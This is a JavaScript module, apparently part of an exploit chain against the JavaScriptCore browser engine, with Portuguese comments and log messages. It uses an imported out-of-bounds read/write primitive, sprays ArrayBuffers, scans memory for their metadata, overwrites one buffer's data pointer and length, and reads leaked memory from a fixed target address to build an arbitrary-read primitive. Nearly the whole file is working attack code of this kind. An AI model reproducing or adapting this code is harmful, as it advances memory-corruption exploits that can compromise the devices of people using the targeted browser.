// js/script3/testMemoryLeakViaJsonTC.mjs (ATUALIZADO PARA ESCANEAMENTO AGRESSIVO)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { toHex, AdvancedInt64 } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

// --- Configuração para Exploit com Escaneamento Agressivo ---
const SCAN_AND_READ_CONFIG = {
    SPRAY_COUNT: 1000, // Aumentado
    BUFFER_SIZE: 256,
    SCAN_RANGE_KB: 256, // Aumentado drasticamente
    
    TARGET_READ_ADDRESS: 0x3BD820n, // Endereço alvo: JSC::ProtoCallFrame::argument

    // Vamos testar vários offsets possíveis para o campo de tamanho
    POSSIBLE_BYTE_LENGTH_OFFSETS: [8, 12, 16],
    // Assumimos que o ponteiro de dados está 8 bytes após o de tamanho
    PTR_OFFSET_FROM_LEN: 8, 
};
// --- Fim dos Parâmetros ---

function readBigInt64(dataview, offset) {
    const low = dataview.getUint32(offset, true);
    const high = dataview.getUint32(offset + 4, true);
    return (BigInt(high) << 32n) | BigInt(low);
}

export async function testArbitraryRead() {
    const FNAME = "testArbitraryReadWithScan";
    logS3(`--- Iniciando Tentativa de Leitura com Escaneamento Agressivo ---`, "test", FNAME);

    if (typeof oob_read_absolute !== 'function') {
        logS3("A primitiva 'oob_read_absolute' é necessária. Abortando.", "error", FNAME);
        return;
    }

    await triggerOOB_primitive();

    let sprayed_buffers = [];
    for (let i = 0; i < SCAN_AND_READ_CONFIG.SPRAY_COUNT; i++) {
        sprayed_buffers.push(new ArrayBuffer(SCAN_AND_READ_CONFIG.BUFFER_SIZE));
    }
    logS3(`${SCAN_AND_READ_CONFIG.SPRAY_COUNT} buffers pulverizados.`, "info", FNAME);
    
    logS3(`Iniciando escaneamento de ${SCAN_AND_READ_CONFIG.SCAN_RANGE_KB} KB...`, "info", FNAME);
    
    let found_ab_metadata_addr = null;
    let found_len_offset = -1;
    const scan_limit = SCAN_AND_READ_CONFIG.SCAN_RANGE_KB * 1024;

    for (let offset = 0; offset < scan_limit; offset += 8) {
        if (found_ab_metadata_addr) break;
        try {
            const potential_metadata = oob_read_absolute(offset, 8);
            if ((potential_metadata & 0xFFFFFFFFn) === BigInt(SCAN_AND_READ_CONFIG.BUFFER_SIZE)) {
                // Candidato forte! Agora vamos verificar se os offsets possíveis de 'byteLength' se alinham.
                for (const len_offset of SCAN_AND_READ_CONFIG.POSSIBLE_BYTE_LENGTH_OFFSETS) {
                    const obj_base_addr = BigInt(offset) - BigInt(len_offset);
                    logS3(`CANDIDATO ENCONTRADO! Offset de Scan: ${toHex(offset)}, Offset de Tamanho Testado: ${len_offset}, Addr. Base do Objeto: ${toHex(obj_base_addr)}`, "good", FNAME);
                    found_ab_metadata_addr = obj_base_addr;
                    found_len_offset = len_offset;
                    break;
                }
            }
        } catch (e) { /* Ignorar erros de leitura */ }
    }

    if (!found_ab_metadata_addr) {
        logS3("Falha ao encontrar um buffer pulverizado. A memória pode estar muito fragmentada ou os offsets de metadados estão incorretos.", "error", FNAME);
        clearOOBEnvironment();
        return;
    }

    try {
        const ptr_offset = found_len_offset + SCAN_AND_READ_CONFIG.PTR_OFFSET_FROM_LEN;
        const corruption_ptr_addr = found_ab_metadata_addr + BigInt(ptr_offset);
        const corruption_len_addr = found_ab_metadata_addr + BigInt(found_len_offset);
        const targetAddrAsInt64 = new AdvancedInt64('0x' + SCAN_AND_READ_CONFIG.TARGET_READ_ADDRESS.toString(16));

        logS3(`Corrompendo o buffer em ${toHex(found_ab_metadata_addr)} usando offset de tamanho ${found_len_offset} e de ponteiro ${ptr_offset}`, "warn", FNAME);
        oob_write_absolute(corruption_ptr_addr, targetAddrAsInt64, 8);
        oob_write_absolute(corruption_len_addr, 0xFFFFFFFF, 4);

        await PAUSE_S3(50);

        for (let i = 0; i < sprayed_buffers.length; i++) {
            if (sprayed_buffers[i].byteLength > SCAN_AND_READ_CONFIG.BUFFER_SIZE) {
                logS3(`--- SUCESSO: O buffer [${i}] foi transformado em uma ferramenta de leitura! ---`, "vuln", FNAME);
                let memory_reader_view = new DataView(sprayed_buffers[i]);
                const leaked_data = readBigInt64(memory_reader_view, 0);

                const targetAddrHex = `0x${SCAN_AND_READ_CONFIG.TARGET_READ_ADDRESS.toString(16)}`;
                const leakedDataHex = `0x${leaked_data.toString(16)}`;
                logS3(`   >> DADO VAZADO de ${targetAddrHex}: ${leakedDataHex}`, "leak", FNAME);
                
                clearOOBEnvironment();
                logS3("--- Primitiva de LEITURA ARBITRÁRIA construída com sucesso! ---", "vuln", FNAME);
                return;
            }
        }
    } catch (e) {
        logS3(`Erro durante a corrupção do buffer encontrado: ${e.message}`, "error", FNAME);
    }
    
    logS3("--- Teste concluído, mas a leitura final falhou. ---", "warn", FNAME);
    clearOOBEnvironment();
}
